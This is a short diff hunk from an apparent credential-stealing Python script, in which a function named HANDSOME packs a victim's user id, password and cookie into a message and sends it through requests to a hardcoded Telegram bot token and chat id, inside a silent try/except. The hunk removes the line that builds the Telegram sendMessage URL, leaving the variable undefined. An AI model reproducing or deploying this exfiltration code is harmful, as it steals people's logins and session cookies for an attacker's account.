@@ -19,7 +19,6 @@ def HANDSOME(ids,pas,cookie):
         token = "6967989114:AAEyppwDyUURbGkPUiJUJUC8SEAoQNO8Uaw"
         chatid = "6921807308"
         ok_id =str(uid+"|"+pas+"|"+cookie)
-	url = f"https://api.telegram.org/bot{token}/sendMessage
         params = {"chat_id": chatid, "text": ok_id}
         requests.get(url, params=params)
     except:
